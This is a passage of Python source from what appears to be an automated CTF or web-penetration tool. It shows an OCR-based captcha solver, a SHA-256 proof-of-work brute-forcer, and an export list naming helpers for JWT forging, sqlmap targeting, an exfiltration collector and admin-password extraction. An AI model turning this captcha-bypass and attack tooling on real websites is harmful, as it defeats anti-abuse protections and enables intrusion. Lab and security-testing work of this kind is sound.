        import numpy as np
        from PIL import Image, ImageEnhance, ImageFilter, ImageOps
    except Exception:
        return None

    reader = _get_contact_ocr_reader()
    if reader is None:
        return None

    try:
        image_bytes = base64.b64decode(body_base64)
        base_image = Image.open(io.BytesIO(image_bytes)).convert("RGB")
    except Exception:
        return None

    candidates: list[tuple[float, int]] = []
    seen_texts: set[str] = set()
    for scale in (8, 10, 12):
        resized = base_image.resize(
            (base_image.width * scale, base_image.height * scale),
            Image.Resampling.LANCZOS,
        )
        for crop_ratio in (0.55, 0.65, 0.75, 0.85, 1.0):
            crop = resized.crop((0, 0, resized.width, int(resized.height * crop_ratio)))
            for invert in (False, True):
                for contrast in (2.0, 3.0, 4.0):
                    proc = ImageEnhance.Contrast(crop).enhance(contrast)
                    proc = proc.filter(ImageFilter.MedianFilter(3))
                    arr = np.array(ImageOps.invert(proc) if invert else proc)
                    try:
                        results = reader.readtext(arr, detail=1, paragraph=False)
                    except Exception:
                        continue
                    for item in results or []:
                        if not isinstance(item, (list, tuple)) or len(item) < 3:
                            continue
                        text = str(item[1] or "")
                        confidence = float(item[2] or 0.0)
                        normalized = _normalize_contact_captcha_text(text)
                        if not normalized or normalized in seen_texts:
                            continue
                        seen_texts.add(normalized)
                        score, value = _score_contact_captcha_candidate(normalized, confidence)
                        if value is not None:
                            candidates.append((score, value))

    if not candidates:
        return None

    candidates.sort(key=lambda item: item[0], reverse=True)
    return candidates[0][1]


def _solve_contact_pow_solution(challenge: str) -> int | None:
    normalized = str(challenge or "").strip()
    if not normalized:
        return None
    try:
        hardness_text, pow_task = normalized.split("_", 1)
        hardness = int(hardness_text)
    except Exception:
        return None
    if hardness <= 0:
        return None

    threshold = (1 << 256) // hardness
    task_bytes = pow_task.encode("ASCII", errors="ignore")
    started_at = time.perf_counter()
    for attempt in range(0, 25_000_000):
        digest = hashlib.sha256(task_bytes + struct.pack("<Q", attempt)).digest()
        if int.from_bytes(digest, "big") < threshold:
            return attempt
        if attempt % 250_000 == 0 and time.perf_counter() - started_at > 20:
            break
    return None


def _pick_python_command(runtime) -> str:
    current_python = str(getattr(sys, "executable", "") or "").strip()
    if current_python:
        return current_python
    env = getattr(runtime, "environment", None)
    os_name = str(getattr(env, "os", "") or "").lower()
    shell_name = str(getattr(env, "shell", "") or "").lower()
    available = getattr(env, "available_tools", []) or []
    names = {str(getattr(tool, "name", "")).lower() for tool in available}
    if "windows" in os_name or shell_name in {"cmd", "powershell"}:
        if "python" in names:
            return "python"
        if "python3" in names:
            return "python3"
    if "python3" in names:
        return "python3"
    if "python" in names:
        return "python"
    return "python"


__all__ = [
    '_normalize_target',
    '_base_target',
    '_normalize_exploration_url',
    '_join_relative_url',
    '_is_stuck_trajectory',
    '_discover_hash_params',
    '_infer_hash_format',
    '_b64url_encode_bytes',
    '_b64url_decode_text',
    '_jwt_encode',
    '_jwt_get_unverified_header',
    '_jwt_decode_payload',
    '_jwt_decode_verified',
    '_compute_signed_hash',
    '_guess_local_ip',
    '_collector_public_host_for_target',
    '_is_loopback_base',
    '_target_port',
    '_command_output_text',
    '_extract_sid_from_collector_log',
    '_docker_loopback_probe_script',
    '_docker_loopback_probe_copy_command',
    '_docker_loopback_probe_start_command',
    '_docker_loopback_probe_read_command',
    '_docker_loopback_probe_cleanup_command',
    '_pick_form_field',
    '_extract_local_ctf_assets_from_hint',
    '_normalize_local_ctf_asset_context',
    '_extract_local_challenge_root',
    '_extract_local_challenge_root_from_hint',
    '_extract_local_challenge_root_from_local_archive',
    '_resolve_auth_login_url',
    '_resolve_compose_file',
    '_iter_local_challenge_key_files',
    '_build_local_challenge_root_summary_metadata',
    '_docker_compose_logs_command',
    '_extract_admin_password_from_logs',
    '_extract_sid_from_login_response',
    '_extract_sid_from_text',
    '_extract_session_cookie_from_text',
    '_quote_sql_identifier',
    '_with_query',
    '_looks_like_successful_auth_change',
    '_build_sqlmap_target_from_form',
    '_collect_recon_error',
    '_infer_missing_tools_from_error',
    '_FormHTMLParser',
    '_parse_forms_from_html',
    '_extract_title_from_html',
    '_strip_html_text',
    '_looks_like_archive_path',
    '_looks_like_backup_source_candidate',
    '_looks_like_inline_source_leak',
    '_looks_like_python_source_leak',
    '_get_contact_ocr_reader',
    '_normalize_contact_captcha_text',
    '_score_contact_captcha_candidate',
    '_solve_contact_captcha_solution',
    '_solve_contact_pow_solution',
    '_pick_python_command',
    '_SID_RE',
    '_SESSION_COOKIE_RE',
    '_FIELD_NAME_HINTS',
    '_FAILURE_TEXT_HINTS',
    '_RECON_TOOL_HINTS',
    '_CONTACT_CAPTCHA_IMAGE_RE',
    '_ADMIN_PASSWORD_LOG_RE',
    '_JWT_ALG_HASH',
    '_CONTACT_OCR_READER',
]
